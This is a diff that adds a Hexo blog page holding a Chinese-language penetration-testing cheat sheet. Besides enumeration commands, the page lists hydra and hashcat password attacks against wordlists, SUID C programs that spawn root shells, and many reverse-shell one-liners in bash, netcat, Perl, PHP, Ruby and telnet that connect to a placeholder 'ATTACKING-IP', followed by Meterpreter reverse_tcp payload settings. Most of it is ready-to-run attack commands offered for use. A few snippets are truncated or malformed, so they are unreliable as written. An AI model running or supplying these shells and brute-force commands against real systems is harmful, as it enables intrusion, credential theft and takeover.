@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="Kuiba's blog" type="application/atom+xml" />
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/clipboard.min.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var cb = null;
+      var els = $(".post figure.highlight");
+      if (els.length) {
+        // Enabled Hexo highlight line number.
+        $(els).each(function (i, e) {
+          // $(e).before("<button class=\"copy button\">clipboard.copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"clipboard.copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling.firstChild.firstChild.firstChild.lastChild.firstChild.firstChild;
+          }
+        });
+      } else {
+        // Disabled Hexo highlight line number.
+        els = $(".post pre code");
+        $(els).each(function (i, e) {
+          // Add button before pre, not code.
+          // $(e).parent().before("<button class=\"copy button\">clipboard.copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"clipboard.copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling;
+          }
+        });
+      }
+      cb.on("success", function (e) {
+        e.clearSelection();
+        var trigger = e.trigger;
+        // Change button text as a user tip.
+        trigger.innerHTML = "<i class=\"far fa-check-square\"></i>";
+        $(trigger).addClass("copied");
+        // Change button text back;
+        setTimeout(function () {
+          trigger.innerHTML = "<i class=\"far fa-copy\"></i>";
+          $(trigger).removeClass("copied");
+        }, 1500);
+      });
+    });
+    </script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>小本本--备忘录 | Kuiba's blog - Listen to your own voice</title>
+  <meta name="generator" content="Hexo 4.2.1"></head>
+  <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">Kuiba's blog</a></h1>
+        <h2 class="subtitle">Listen to your own voice</h2>
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%8A%80%E6%9C%AF%E6%B0%B4%E6%96%87/">技术水文</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E8%BD%AC%E8%BD%BD%E6%90%AC%E8%BF%90/">转载搬运</a></li>
+        
+        <li role="menuitem"><a href="/categories/HTB%E6%90%AC%E8%BF%90/">HTB搬运</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://kuibarj.top/posts/554d428f.html">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Kuiba">
+       <meta itemprop="description" content="这是一个最好的时代，也是最坏的时代，我们亲身经历着激动人心的变革，也往往会陷入选择的迷茫。">
+       <meta itemprop="image" content="/images/avatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="Kuiba's blog">
+      </span>
+    </div>
+
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">小本本--备忘录</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-02-09T17:02:18+08:00">2019-02-09 17:02:18</time></span>
+        </span>
+        
+        
+        
+        <span class="post-meta-divider divider">|</span>
+        
+        <span class="post-categories">
+          
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%9D%82%E9%A1%B9/" itemprop="url" rel="index"><span itemprop="name">杂项</span></a></span>
+        </span>
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1NN5aav1H3KVjSZFHq6zKppXaI.jpg"></p>
+<a id="more"></a>
+
+<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a><center>枚举</center></h2><h3 id="常规枚举"><a href="#常规枚举" class="headerlink" title="常规枚举"></a>常规枚举</h3><p>显示详细信息，同步，扫描所有端口，使用所有脚本，不探测主机是否存活</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -vv -Pn -A -sC -sS -T 4 -p- 192.168.1.1<br></code></pre></td></tr></table></figure>
+
+<p>显示详细信息，SYN扫描，版本信息和针对服务的脚本。</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -v -sS -A -T4 192.168.1.1<br></code></pre></td></tr></table></figure>
+
+<p>扫描易受攻击的SMB服务器的Nmap脚本</p>
+<p>注意：unsafe = 1可能会导致中断</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 [host]<br></code></pre></td></tr></table></figure>
+
+<p>获取同网段其他主机</p>
+<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bah">netdiscover -r 192.168.1.0&#x2F;24<br></code></pre></td></tr></table></figure>
+
+<h3 id="FTP-21"><a href="#FTP-21" class="headerlink" title="FTP (21)"></a>FTP (21)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.1.1<br></code></pre></td></tr></table></figure>
+<h3 id="SSH-22"><a href="#SSH-22" class="headerlink" title="SSH (22)"></a>SSH (22)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh [ip] 22<br></code></pre></td></tr></table></figure>
+<h3 id="SMTP-25"><a href="#SMTP-25" class="headerlink" title="SMTP (25)"></a>SMTP (25)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.1.1<br><br>nc -nvv [ip] 25<br><br>telnet [ip] 25<br></code></pre></td></tr></table></figure>
+
+<h3 id="Web-80-443"><a href="#Web-80-443" class="headerlink" title="Web (80/443)"></a>Web (80/443)</h3><p>birbuster(GUI)</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.1.1/<br><br>nikto -h 192.168.1.1<br></code></pre></td></tr></table></figure>
+<h3 id="Pop3-110"><a href="#Pop3-110" class="headerlink" title="Pop3 (110)"></a>Pop3 (110)</h3><p>telnet [ip] 110</p>
+<p>USER [username]</p>
+<p>PASS [password]</p>
+<p>列出信息<br><code>LIST</code></p>
+<p>查找邮件<br><code>RETR [message number]</code></p>
+<h3 id="RPCBind-111"><a href="#RPCBind-111" class="headerlink" title="RPCBind (111)"></a>RPCBind (111)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcinfo –p 192.168.1.1<br></code></pre></td></tr></table></figure>
+
+<h3 id="SMB-RPC-139-445"><a href="#SMB-RPC-139-445" class="headerlink" title="SMB\RPC (139/445)"></a>SMB\RPC (139/445)</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bahs">enum4linux –a 192.168.1.1<br></code></pre></td></tr></table></figure>
+
+<p>枚举子网上的Windows/Samba服务器，查找Windows MAC地址，netbios名称并发现客户端工作组/域</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nbtscan 192.168.1.1<br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.1.1<br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse<br></code></pre></td></tr></table></figure>
+
+<p>列出Ipc共享</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //192.168.1.X/<br><br>smbclient //192.168.1.X/ipc$ -U user<br></code></pre></td></tr></table></figure>
+
+<h3 id="SNMP-161"><a href="#SNMP-161" class="headerlink" title="SNMP (161)"></a>SNMP (161)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 10.0.0.0<br><br>snmpcheck -t 192.168.1.X -c public<br><br>onesixtyone -c names -i hosts<br><br>nmap -sT -p 161 192.168.X.X -oG snmp_results.txt<br><br>snmpenum -t 192.168.1.X<br></code></pre></td></tr></table></figure>
+
+<h3 id="Oracle-1521"><a href="#Oracle-1521" class="headerlink" title="Oracle (1521)"></a>Oracle (1521)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">tnscmd10g version -h 192.168.X.X<br><br>tnscmd10g status -h 192.168.X.X<br></code></pre></td></tr></table></figure>
+
+<h3 id="Mysql-3306"><a href="#Mysql-3306" class="headerlink" title="Mysql (3306)"></a>Mysql (3306)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -Pn -vv  192.168.1.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122<br></code></pre></td></tr></table></figure>
+
+<h3 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup -&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span>=any -&gt; ls -d baidu.com<br><br>dig axfr baidu.com @ns1.baidu.com<br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml<br></code></pre></td></tr></table></figure>
+
+<h3 id="挂载文件共享"><a href="#挂载文件共享" class="headerlink" title="挂载文件共享"></a>挂载文件共享</h3><p><code>showmount -e</code></p>
+<p>将共享挂载到/ mnt / nfs而不锁定它</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount 192.168.1.1:/vol/share /mnt/nfs  -nolock<br></code></pre></td></tr></table></figure>
+<p>在Linux上挂载Windows CIFS/SMB共享位于/mnt/cifs如果删除密码，它将在CLI上提示</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -tcifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs<br></code></pre></td></tr></table></figure>
+
+<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>通过显示横幅进行基本版本控制/指纹识别</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -v 192.168.1.1 25<br><br>telnet 192.168.1.1 25<br></code></pre></td></tr></table></figure>
+<h3 id="搜索利用exp"><a href="#搜索利用exp" class="headerlink" title="搜索利用exp"></a>搜索利用exp</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit windows 2003 | grep -i <span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure>
+<h3 id="编译EXP"><a href="#编译EXP" class="headerlink" title="编译EXP"></a>编译EXP</h3><p>编译C代码，在’gcc’之后添加<code>-m32</code>，用于在64位Linux上编译32位代码,不添加则编译64位的exp</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -o exploit exploit.c<br></code></pre></td></tr></table></figure>
+<p>在Linux上编译windows .exe</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe<br></code></pre></td></tr></table></figure>
+
+<h3 id="检测数据包"><a href="#检测数据包" class="headerlink" title="检测数据包"></a>检测数据包</h3><p>tcpdump用于接口eth0上的端口80，输出到output.pcap</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump tcp port 80 -w output.pcap -i eth0<br></code></pre></td></tr></table></figure>
+<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">hash</span>-identifier [<span class="hljs-built_in">hash</span>]<br><br>john hashes.txt<br><br>hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+<p><a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href="https://hashkiller.co.uk/" target="_blank" rel="noopener">https://hashkiller.co.uk/</a></p>
+<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>web post表单</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra 10.0.0.1 http-post-form “/admin.php:target=auth&amp;mode=login&amp;user=^USER^&amp;password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin<br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt [ip] [协议]<br></code></pre></td></tr></table></figure>
+
+<p>爆破SMTP</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp –V<br></code></pre></td></tr></table></figure>
+
+<h2 id="Shells-amp-Reverse-Shells"><a href="#Shells-amp-Reverse-Shells" class="headerlink" title="Shells &amp; Reverse Shells"></a><center>Shells &amp; Reverse Shells</center></h2><h3 id="SUID-C-Shells"><a href="#SUID-C-Shells" class="headerlink" title="SUID C Shells"></a>SUID C Shells</h3><p><strong>/bin/bash</strong></p>
+<figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>system(<span class="hljs-string">"/bin/bash"</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>/bin/sh</strong></p>
+<figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>system(<span class="hljs-string">"/bin/sh"</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="TTY-Shell"><a href="#TTY-Shell" class="headerlink" title="TTY Shell"></a>TTY Shell</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span><br><br><span class="hljs-built_in">echo</span> os.system(<span class="hljs-string">'/bin/bash'</span>)<br><br>/bin/sh –i<br><br>execute(<span class="hljs-string">'/bin/sh'</span>)<br><br>!sh <span class="hljs-comment">#nmap</span><br><br><span class="hljs-string">"!bash #vi</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Spawn-Ruby-Shell"><a href="#Spawn-Ruby-Shell" class="headerlink" title="Spawn Ruby Shell"></a>Spawn Ruby Shell</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">"/bin/sh"</span><br><br>ruby -rsocket -e<span class="hljs-string">'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs `bash">nc -e &#x2F;bin&#x2F;sh ATTACKING-IP 80<br><br>&#x2F;bin&#x2F;sh | nc ATTACKING-IP 80<br><br>rm -f &#x2F;tmp&#x2F;p; mknod &#x2F;tmp&#x2F;p p &amp;&amp; nc ATTACKING-IP 4444 0&#x2F;tmp&#x2F;p<br></code></pre></td></tr></table></figure>
+
+<h3 id="telnet反弹Shell"><a href="#telnet反弹Shell" class="headerlink" title="telnet反弹Shell"></a>telnet反弹Shell</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p<br><br>telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443<br></code></pre></td></tr></table></figure>
+
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>假设TCP使用文件描述符3.如果它不起作用，请尝试4,5或6）</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0<br><br>0&lt;&amp;196;<span class="hljs-built_in">exec</span> 196&lt;&gt;/dev/tcp/ATTACKING-IP/80; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br><br><span class="hljs-built_in">exec</span> 5&lt;&gt;/dev/tcp/ATTACKING-IP/80 cat &lt;&amp;5 | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="hljs-keyword">done</span><br><br>bash -i &gt;&amp; /dev/tcp/ATTACKING-IP/80 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">"/bin/sh"</span>;<br><br>perl —e <span class="hljs-string">'exec "/bin/sh";'</span><br><br>perl -e <span class="hljs-string">'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br><br>perl -MIO -e <span class="hljs-string">'$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span><br><br>perl -e <span class="hljs-string">'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a><center>Meterpreter</center></h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
+<h3 id="Windows-VNV"><a href="#Windows-VNV" class="headerlink" title="Windows VNV"></a>Windows VNV</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/vncinject/reverse_tcp<br><br><span class="hljs-built_in">set</span> ViewOnly <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>
